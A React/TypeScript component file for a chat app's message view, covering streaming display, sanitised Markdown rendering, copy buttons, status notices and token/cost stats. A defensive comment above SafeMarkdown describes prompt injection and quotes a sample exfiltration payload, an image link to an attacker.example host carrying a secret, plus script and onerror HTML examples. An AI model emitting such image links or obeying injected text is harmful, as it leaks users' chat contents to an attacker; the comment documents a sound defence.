import { useState, type ReactNode } from "react";
import Markdown from "react-markdown";
import "katex/dist/katex.min.css";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { formatMoney, formatMs } from "./format";
import { CheckIcon, CopyIcon } from "./Icons";
import { normalizeMath } from "./math";
import { describeRate, useRateInfo, useUsdToInr } from "./rate";
import type { Message as MessageModel } from "./types";

/** A message plus UI-only state that is not stored in the database. */
export interface ViewMessage extends MessageModel {
  /** Safe error text the server sent in an SSE `error` event (this session only). */
  errorMessage?: string;
}

export default function Message({ message }: { message: ViewMessage }) {
  const isAssistant = message.role === "assistant";
  const isStreaming = message.status === "streaming";

  return (
    <article className={`msg msg-${message.role} status-${message.status}`}>
      <div className="msg-body">
        {isStreaming && message.content === "" ? (
          // Loading state: request sent, no token has arrived yet.
          <span className="thinking" aria-live="polite">
            <i /> <i /> <i />
            <span className="sr-only">Thinking</span>
          </span>
        ) : isStreaming || !isAssistant ? (
          // While streaming we show PLAIN TEXT (pre-wrap keeps newlines).
          // Why not render Markdown on every delta? A half-received document is
          // often invalid Markdown: an opening ``` fence with no closing fence
          // swallows everything after it as "code"; "**bo" has no closing
          // marker; a table is cut mid-row. Re-parsing on every token makes the
          // layout jump and flicker as constructs open and close. We render
          // Markdown once, when the text is final. (User text is also shown
          // plain: people don't expect their own message to be reformatted.)
          <div className="plain">{message.content}</div>
        ) : (
          <SafeMarkdown text={message.content} />
        )}
      </div>

      {isAssistant && <Notices message={message} />}
      {isAssistant && !isStreaming && (
        <div className="msg-foot">
          {message.content !== "" && <CopyButton text={message.content} label="Copy reply" />}
          <Stats message={message} />
        </div>
      )}
    </article>
  );
}

function CopyButton({ text, label, className = "" }: { text: string; label: string; className?: string }) {
  const [copied, setCopied] = useState(false);
  async function copy() {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1500);
    } catch {
      // Clipboard can be blocked (insecure origin, permissions); nothing useful to show.
    }
  }
  return (
    <button type="button" className={`icon-btn ${className}`} onClick={() => void copy()} title={label} aria-label={label}>
      {copied ? <CheckIcon /> : <CopyIcon />}
      <span>{copied ? "Copied" : "Copy"}</span>
    </button>
  );
}

/** Plain text of a hast node (react-markdown's syntax tree), used for "copy code". */
type HastNode = { type: string; value?: string; children?: HastNode[]; properties?: { className?: string[] } };
const hastText = (n: HastNode): string => (n.type === "text" ? (n.value ?? "") : (n.children ?? []).map(hastText).join(""));

function CodeBlock({ node, children }: { node?: HastNode; children?: ReactNode }) {
  const code = node?.children?.[0];
  const lang = code?.properties?.className?.find((c) => c.startsWith("language-"))?.slice(9);
  return (
    <div className="codeblock">
      <div className="codeblock-bar">
        <span>{lang ?? "text"}</span>
        <CopyButton text={code ? hastText(code).replace(/\n$/, "") : ""} label="Copy code" />
      </div>
      <pre>{children}</pre>
    </div>
  );
}

/**
 * LLM output is UNTRUSTED input. It can be influenced by whatever the model
 * read (including a malicious user or pasted document - prompt injection), so we
 * treat it like user-generated content:
 *
 *  - react-markdown builds React elements; it never uses dangerouslySetInnerHTML.
 *    Raw HTML in the Markdown (<script>, <img onerror=...>) is shown as inert
 *    text, because we do NOT enable rehype-raw.
 *  - Its default URL transform strips dangerous link schemes like javascript:.
 *  - Syntax highlighting (rehype-highlight) only wraps code text in <span class> elements;
 *    it never emits raw HTML.
 *  - Images are removed. A rendered ![](https://attacker.example/?q=<secret>)
 *    makes the BROWSER send a request to the attacker, a known way to exfiltrate
 *    chat contents via prompt injection.
 *  - Links open in a new tab with rel=noopener noreferrer.
 */
function SafeMarkdown({ text }: { text: string }) {
  return (
    <Markdown
      // singleDollarTextMath off: "costs $5 and $6" must stay text. Math arrives as \( \) / \[ \],
      // which normalizeMath() rewrites to $$ ... $$ before parsing.
      remarkPlugins={[remarkGfm, [remarkMath, { singleDollarTextMath: false }]]}
      rehypePlugins={[[rehypeKatex, { throwOnError: false }], [rehypeHighlight, { detect: false }]]}
      disallowedElements={["img"]}
      components={{
        a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
        pre: ({ node, children }) => <CodeBlock node={node as HastNode | undefined}>{children}</CodeBlock>,
      }}
    >
      {normalizeMath(text)}
    </Markdown>
  );
}

function Notices({ message }: { message: ViewMessage }) {
  const hasText = message.content !== "";
  if (message.status === "error") {
    return (
      <div className="notice notice-error" role="alert">
        <strong>{message.errorMessage ?? "This response was interrupted."}</strong>{" "}
        {hasText ? "The partial response above was saved." : "No text was received."}
      </div>
    );
  }
  if (message.status === "cancelled") {
    return (
      <div className="notice notice-info">
        Stopped.{hasText ? " Showing the partial response." : " Nothing was generated."}
      </div>
    );
  }
  if (message.status === "complete" && message.stop_reason === "max_output_tokens") {
    return (
      <div className="notice notice-warn">
        Response was cut off because it reached the output limit.
      </div>
    );
  }
  if (message.status === "complete" && message.stop_reason === "content_filter") {
    return <div className="notice notice-warn">The response was stopped by a content filter.</div>;
  }
  return null;
}

const n = (v: number | null) => (v ?? 0).toLocaleString();

/**
 * Per-reply usage, exactly as the provider reported it. If it reported none (a
 * cancelled or failed reply), say so instead of showing made-up numbers.
 */
function Stats({ message }: { message: ViewMessage }) {
  const rate = useUsdToInr();
  const rateInfo = useRateInfo();
  const hasUsage = message.total_tokens !== null;
  return (
    <div className="stats">
      {hasUsage ? (
        <>
          <span title="Tokens sent to the model: instructions + conversation history + your message">
            <b>{n(message.input_tokens)}</b> input tokens
            {message.cached_input_tokens ? ` (${n(message.cached_input_tokens)} cached)` : ""}
          </span>
          <span title="Tokens the model generated for this reply">
            <b>{n(message.output_tokens)}</b> output tokens
            {message.reasoning_tokens ? ` (${n(message.reasoning_tokens)} reasoning)` : ""}
          </span>
          <span title={`USD calculated from the reported usage and AI/data/prices.toml. ${describeRate(rateInfo)}`}>
            <b>{formatMoney(message.cost_usd, rate)}</b>
          </span>
        </>
      ) : (
        <span title="OpenAI reported no usage for this reply (for example it was stopped or failed before finishing)">
          usage unavailable
        </span>
      )}
      {message.ttft_ms !== null && (
        <span title="Time to first token: how long until the first text appeared">TTFT {formatMs(message.ttft_ms)}</span>
      )}
      {message.latency_ms !== null && <span title="Total time for the reply">{formatMs(message.latency_ms)}</span>}
      {message.served_model && (
        <span title={message.model && message.model !== message.served_model ? `requested: ${message.model}` : "model that served this reply"}>
          {message.served_model}
        </span>
      )}
    </div>
  );
}
